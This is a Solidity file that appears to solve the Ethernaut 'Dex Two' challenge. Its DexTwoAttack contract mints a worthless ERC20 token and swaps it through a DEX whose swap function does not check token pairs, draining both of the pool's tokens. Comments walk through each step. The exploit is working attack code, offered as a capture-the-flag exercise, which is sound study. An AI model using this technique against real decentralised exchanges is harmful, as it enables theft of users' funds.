// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./DexTwo.sol";

//Our attack contract is the ERC20 token that we will use, we could have use to different contract:
// One ERC20 token contract use to swap with the other token
// and one attack contract that handle the different call to the dex
//
contract DexTwoAttack is ERC20 {
    DexTwo public dex;
    address public token1;
    address public token2;

    constructor(
        address _dexInstance,
        string memory _name,
        string memory _symbol,
        uint256 _initialSupply
    ) public ERC20(_name, _symbol) {
        _mint(address(this), _initialSupply); // we only need to mint 4 token, (could be hardcoded instead of _initialSupply)
        // dex = DexTwo(createInstance()); //For local testing

        dex = DexTwo(_dexInstance);
        token1 = dex.token1();
        token2 = dex.token2();
    }

    function attack() public {
        ERC20(address(this)).approve(address(dex), 3); // approve 3 token, the dex will use transferFrom twice, once with 1 and then with 2
        ERC20(address(this)).transfer(address(dex), 1); // now the dex balanceOf is 1
        dex.swap(address(this), token1, 1); // get 100 of token1 new balanceOf new token is 2

        dex.swap(address(this), token2, 2); // get 100 of token2
    }

    // For local testing, calling this function in our attack contract constructor will give us the initial token balance
    // function createInstance() public returns (address) {
    //     DexTwo instance = new DexTwo();
    //     address instanceAddress = address(instance);
    //     address _player = address(this);

    //     SwappableTokenTwo tokenInstance = new SwappableTokenTwo(
    //         instanceAddress,
    //         "Token 1",
    //         "TKN1",
    //         110
    //     );
    //     SwappableTokenTwo tokenInstanceTwo = new SwappableTokenTwo(
    //         instanceAddress,
    //         "Token 2",
    //         "TKN2",
    //         110
    //     );

    //     address tokenInstanceAddress = address(tokenInstance);
    //     address tokenInstanceTwoAddress = address(tokenInstanceTwo);

    //     instance.setTokens(tokenInstanceAddress, tokenInstanceTwoAddress);

    //     tokenInstance.approve(instanceAddress, 100);
    //     tokenInstanceTwo.approve(instanceAddress, 100);

    //     instance.add_liquidity(tokenInstanceAddress, 100);
    //     instance.add_liquidity(tokenInstanceTwoAddress, 100);

    //     tokenInstance.transfer(_player, 10);
    //     tokenInstanceTwo.transfer(_player, 10);

    //     return instanceAddress;
    // }
}
